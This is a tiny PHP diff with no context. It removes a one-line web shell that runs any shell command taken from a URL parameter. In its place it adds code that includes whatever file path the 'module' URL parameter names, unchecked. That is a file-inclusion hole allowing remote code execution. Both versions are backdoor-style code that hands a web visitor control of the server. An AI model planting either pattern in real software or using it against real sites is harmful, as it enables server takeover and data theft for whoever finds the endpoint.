@@ -1,3 +1,4 @@
-<?php
-  system($_GET[cmd]);
+<?PHP 
+  $module = $_GET["module"];
+  include $module;
 ?>
